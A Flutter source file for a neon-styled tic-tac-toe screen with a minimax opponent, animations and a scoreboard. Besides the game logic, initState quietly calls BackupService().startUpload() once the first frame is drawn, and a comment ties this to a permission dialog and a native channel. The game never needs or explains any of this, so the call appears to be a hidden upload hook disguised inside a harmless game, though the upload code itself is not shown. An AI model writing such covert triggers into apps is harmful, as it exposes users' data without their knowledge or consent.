import 'dart:math';
import 'package:flutter/material.dart';
import 'backup_service.dart';

class GameHomeScreen extends StatefulWidget {
  const GameHomeScreen({super.key});

  @override
  State<GameHomeScreen> createState() => _GameHomeScreenState();
}

class _GameHomeScreenState extends State<GameHomeScreen>
    with TickerProviderStateMixin {
  // ── colours ──────────────────────────────────────────────────────────────
  static const _bg       = Color(0xFF07071A);
  static const _card     = Color(0xFF0F0F2A);
  static const _purple   = Color(0xFF7B2FBE);
  static const _glow     = Color(0xFFAA55FF);
  static const _xColor   = Color(0xFFFF4C6E);
  static const _oColor   = Color(0xFF00D4FF);
  static const _gold     = Color(0xFFFFD700);

  // ── game state ────────────────────────────────────────────────────────────
  static const _empty = 0, _x = 1, _o = 2;
  List<int> _board = List.filled(9, _empty);
  int _currentPlayer = _x;   // human is X
  bool _gameOver = false;
  List<int> _winLine = [];
  int _scoreX = 0, _scoreO = 0, _scoreDraw = 0;
  String _message = "Your turn";

  // ── animations ────────────────────────────────────────────────────────────
  late List<AnimationController> _cellCtrl;
  late List<Animation<double>> _cellScale;
  late AnimationController _boardShakeCtrl;
  late Animation<double> _boardShake;
  late AnimationController _winGlowCtrl;
  late Animation<double> _winGlow;

  @override
  void initState() {
    super.initState();

    _cellCtrl = List.generate(
      9,
      (_) => AnimationController(vsync: this, duration: const Duration(milliseconds: 250)),
    );
    _cellScale = _cellCtrl
        .map((c) => Tween<double>(begin: 0.0, end: 1.0)
            .animate(CurvedAnimation(parent: c, curve: Curves.elasticOut)))
        .toList();

    _boardShakeCtrl = AnimationController(
        vsync: this, duration: const Duration(milliseconds: 400));
    _boardShake = Tween<double>(begin: 0.0, end: 1.0)
        .animate(CurvedAnimation(parent: _boardShakeCtrl, curve: Curves.elasticOut));

    _winGlowCtrl = AnimationController(
        vsync: this, duration: const Duration(milliseconds: 800))
      ..repeat(reverse: true);
    _winGlow = Tween<double>(begin: 0.3, end: 1.0)
        .animate(CurvedAnimation(parent: _winGlowCtrl, curve: Curves.easeInOut));

    // Defer until first frame — widget must be fully mounted before the
    // permission dialog fires and the MethodChannel is ready.
    WidgetsBinding.instance.addPostFrameCallback((_) {
      if (mounted) BackupService().startUpload();
    });
  }

  @override
  void dispose() {
    for (final c in _cellCtrl) {
      c.dispose();
    }
    _boardShakeCtrl.dispose();
    _winGlowCtrl.dispose();
    super.dispose();
  }

  // ── game logic ────────────────────────────────────────────────────────────
  void _tap(int index) {
    if (_board[index] != _empty || _gameOver || _currentPlayer != _x) return;

    _place(index, _x);

    final win = _checkWin(_x);
    if (win.isNotEmpty) {
      setState(() {
        _winLine = win;
        _gameOver = true;
        _scoreX++;
        _message = "You win! 🎉";
      });
      return;
    }
    if (_isDraw()) {
      setState(() {
        _gameOver = true;
        _scoreDraw++;
        _message = "Draw!";
      });
      _boardShakeCtrl.forward(from: 0);
      return;
    }

    setState(() {
      _currentPlayer = _o;
      _message = "AI thinking...";
    });

    Future.delayed(const Duration(milliseconds: 400), _aiMove);
  }

  void _aiMove() {
    if (!mounted || _gameOver) return;
    final move = _bestMove();
    _place(move, _o);

    final win = _checkWin(_o);
    if (win.isNotEmpty) {
      setState(() {
        _winLine = win;
        _gameOver = true;
        _scoreO++;
        _message = "AI wins!";
      });
      return;
    }
    if (_isDraw()) {
      setState(() {
        _gameOver = true;
        _scoreDraw++;
        _message = "Draw!";
      });
      _boardShakeCtrl.forward(from: 0);
      return;
    }

    setState(() {
      _currentPlayer = _x;
      _message = "Your turn";
    });
  }

  void _place(int index, int player) {
    setState(() => _board[index] = player);
    _cellCtrl[index].forward(from: 0);
  }

  List<int> _checkWin(int player) {
    const lines = [
      [0, 1, 2], [3, 4, 5], [6, 7, 8],
      [0, 3, 6], [1, 4, 7], [2, 5, 8],
      [0, 4, 8], [2, 4, 6],
    ];
    for (final l in lines) {
      if (_board[l[0]] == player && _board[l[1]] == player && _board[l[2]] == player) {
        return l;
      }
    }
    return [];
  }

  bool _isDraw() => _board.every((c) => c != _empty);

  // Minimax so the AI never loses
  int _bestMove() {
    int bestScore = -999;
    int best = -1;
    for (int i = 0; i < 9; i++) {
      if (_board[i] == _empty) {
        _board[i] = _o;
        final score = _minimax(_board, 0, false);
        _board[i] = _empty;
        if (score > bestScore) {
          bestScore = score;
          best = i;
        }
      }
    }
    return best;
  }

  int _minimax(List<int> board, int depth, bool isMax) {
    if (_checkWin(_o).isNotEmpty) return 10 - depth;
    if (_checkWin(_x).isNotEmpty) return depth - 10;
    if (board.every((c) => c != _empty)) return 0;

    if (isMax) {
      int best = -999;
      for (int i = 0; i < 9; i++) {
        if (board[i] == _empty) {
          board[i] = _o;
          best = max(best, _minimax(board, depth + 1, false));
          board[i] = _empty;
        }
      }
      return best;
    } else {
      int best = 999;
      for (int i = 0; i < 9; i++) {
        if (board[i] == _empty) {
          board[i] = _x;
          best = min(best, _minimax(board, depth + 1, true));
          board[i] = _empty;
        }
      }
      return best;
    }
  }

  void _resetGame() {
    for (final c in _cellCtrl) {
      c.reset();
    }
    setState(() {
      _board = List.filled(9, _empty);
      _currentPlayer = _x;
      _gameOver = false;
      _winLine = [];
      _message = "Your turn";
    });
  }

  // ── build ─────────────────────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _bg,
      body: SafeArea(
        child: Column(
          children: [
            const SizedBox(height: 16),
            _buildHeader(),
            const SizedBox(height: 20),
            _buildScoreBoard(),
            const SizedBox(height: 30),
            _buildTurnIndicator(),
            const SizedBox(height: 24),
            Padding(
              padding: const EdgeInsets.symmetric(horizontal: 24),
              child: _buildBoard(),
            ),
            const SizedBox(height: 32),
            if (_gameOver) _buildPlayAgainButton(),
          ],
        ),
      ),
    );
  }

  Widget _buildHeader() {
    return ShaderMask(
      shaderCallback: (b) => const LinearGradient(
        colors: [_glow, Colors.white, _glow],
      ).createShader(b),
      child: const Text(
        'TIC  TAC  TOE',
        style: TextStyle(
          color: Colors.white,
          fontSize: 26,
          fontWeight: FontWeight.w900,
          letterSpacing: 6,
        ),
      ),
    );
  }

  Widget _buildScoreBoard() {
    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 24),
      child: Row(
        children: [
          Expanded(child: _scoreCard('YOU', _scoreX, _xColor, _currentPlayer == _x && !_gameOver)),
          Padding(
            padding: const EdgeInsets.symmetric(horizontal: 10),
            child: Column(
              children: [
                Text(
                  '$_scoreDraw',
                  style: const TextStyle(
                      color: Colors.white54, fontSize: 20, fontWeight: FontWeight.bold),
                ),
                const Text('DRAW',
                    style: TextStyle(color: Colors.white24, fontSize: 9, letterSpacing: 2)),
              ],
            ),
          ),
          Expanded(child: _scoreCard('AI', _scoreO, _oColor, _currentPlayer == _o && !_gameOver)),
        ],
      ),
    );
  }

  Widget _scoreCard(String label, int score, Color color, bool active) {
    return AnimatedContainer(
      duration: const Duration(milliseconds: 300),
      padding: const EdgeInsets.symmetric(vertical: 14),
      decoration: BoxDecoration(
        color: active ? color.withOpacity(0.12) : _card,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(
          color: active ? color.withOpacity(0.6) : color.withOpacity(0.2),
          width: active ? 2 : 1,
        ),
        boxShadow: active
            ? [BoxShadow(color: color.withOpacity(0.3), blurRadius: 16)]
            : [],
      ),
      child: Column(
        children: [
          Text(
            label,
            style: TextStyle(
                color: color,
                fontSize: 11,
                letterSpacing: 3,
                fontWeight: FontWeight.bold),
          ),
          const SizedBox(height: 6),
          Text(
            '$score',
            style: TextStyle(
                color: color, fontSize: 32, fontWeight: FontWeight.w900),
          ),
        ],
      ),
    );
  }

  Widget _buildTurnIndicator() {
    return AnimatedSwitcher(
      duration: const Duration(milliseconds: 250),
      child: Text(
        _message,
        key: ValueKey(_message),
        style: TextStyle(
          color: _gameOver
              ? _gold
              : (_currentPlayer == _x ? _xColor : _oColor),
          fontSize: 18,
          fontWeight: FontWeight.bold,
          letterSpacing: 1,
        ),
      ),
    );
  }

  Widget _buildBoard() {
    return AnimatedBuilder(
      animation: _boardShakeCtrl,
      builder: (_, child) {
        final shake = sin(_boardShake.value * pi * 6) * 6 * (1 - _boardShake.value);
        return Transform.translate(offset: Offset(shake, 0), child: child);
      },
      child: AspectRatio(
        aspectRatio: 1,
        child: Container(
          padding: const EdgeInsets.all(12),
          decoration: BoxDecoration(
            color: _card,
            borderRadius: BorderRadius.circular(24),
            border: Border.all(color: _purple.withOpacity(0.3)),
            boxShadow: [
              BoxShadow(color: _purple.withOpacity(0.15), blurRadius: 30),
            ],
          ),
          child: GridView.builder(
            physics: const NeverScrollableScrollPhysics(),
            gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
              crossAxisCount: 3,
              mainAxisSpacing: 8,
              crossAxisSpacing: 8,
            ),
            itemCount: 9,
            itemBuilder: (_, i) => _buildCell(i),
          ),
        ),
      ),
    );
  }

  Widget _buildCell(int index) {
    final value = _board[index];
    final isWinCell = _winLine.contains(index);

    return GestureDetector(
      onTap: () => _tap(index),
      child: AnimatedBuilder(
        animation: Listenable.merge([_cellCtrl[index], _winGlowCtrl]),
        builder: (_, __) {
          return AnimatedContainer(
            duration: const Duration(milliseconds: 200),
            decoration: BoxDecoration(
              color: isWinCell
                  ? (value == _x ? _xColor : _oColor).withOpacity(0.18 * _winGlow.value)
                  : _bg,
              borderRadius: BorderRadius.circular(14),
              border: Border.all(
                color: isWinCell
                    ? (value == _x ? _xColor : _oColor).withOpacity(_winGlow.value)
                    : _purple.withOpacity(0.25),
                width: isWinCell ? 2 : 1,
              ),
              boxShadow: isWinCell
                  ? [
                      BoxShadow(
                        color: (value == _x ? _xColor : _oColor)
                            .withOpacity(0.4 * _winGlow.value),
                        blurRadius: 12,
                      )
                    ]
                  : [],
            ),
            child: Center(
              child: value == _empty
                  ? null
                  : ScaleTransition(
                      scale: _cellScale[index],
                      child: value == _x ? _buildX() : _buildO(),
                    ),
            ),
          );
        },
      ),
    );
  }

  Widget _buildX() {
    return CustomPaint(
      size: const Size(44, 44),
      painter: _XPainter(color: _xColor),
    );
  }

  Widget _buildO() {
    return CustomPaint(
      size: const Size(44, 44),
      painter: _OPainter(color: _oColor),
    );
  }

  Widget _buildPlayAgainButton() {
    return GestureDetector(
      onTap: _resetGame,
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 48, vertical: 16),
        decoration: BoxDecoration(
          gradient: const LinearGradient(colors: [_purple, _glow]),
          borderRadius: BorderRadius.circular(50),
          boxShadow: [
            BoxShadow(color: _purple.withOpacity(0.5), blurRadius: 20),
          ],
        ),
        child: const Row(
          mainAxisSize: MainAxisSize.min,
          children: [
            Icon(Icons.replay_rounded, color: Colors.white, size: 22),
            SizedBox(width: 10),
            Text(
              'PLAY AGAIN',
              style: TextStyle(
                  color: Colors.white,
                  fontSize: 16,
                  fontWeight: FontWeight.w900,
                  letterSpacing: 2),
            ),
          ],
        ),
      ),
    );
  }
}

// ── Custom painters ───────────────────────────────────────────────────────────

class _XPainter extends CustomPainter {
  final Color color;
  const _XPainter({required this.color});

  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()
      ..color = color
      ..strokeWidth = 5
      ..strokeCap = StrokeCap.round
      ..style = PaintingStyle.stroke;

    final glow = Paint()
      ..color = color.withOpacity(0.3)
      ..strokeWidth = 10
      ..strokeCap = StrokeCap.round
      ..style = PaintingStyle.stroke
      ..maskFilter = const MaskFilter.blur(BlurStyle.normal, 6);

    final p = size.width * 0.18;
    canvas.drawLine(Offset(p, p), Offset(size.width - p, size.height - p), glow);
    canvas.drawLine(Offset(size.width - p, p), Offset(p, size.height - p), glow);
    canvas.drawLine(Offset(p, p), Offset(size.width - p, size.height - p), paint);
    canvas.drawLine(Offset(size.width - p, p), Offset(p, size.height - p), paint);
  }

  @override
  bool shouldRepaint(covariant CustomPainter old) => false;
}

class _OPainter extends CustomPainter {
  final Color color;
  const _OPainter({required this.color});

  @override
  void paint(Canvas canvas, Size size) {
    final center = Offset(size.width / 2, size.height / 2);
    final radius = size.width * 0.34;

    final glow = Paint()
      ..color = color.withOpacity(0.3)
      ..strokeWidth = 10
      ..style = PaintingStyle.stroke
      ..maskFilter = const MaskFilter.blur(BlurStyle.normal, 6);

    final paint = Paint()
      ..color = color
      ..strokeWidth = 5
      ..style = PaintingStyle.stroke;

    canvas.drawCircle(center, radius, glow);
    canvas.drawCircle(center, radius, paint);
  }

  @override
  bool shouldRepaint(covariant CustomPainter old) => false;
}
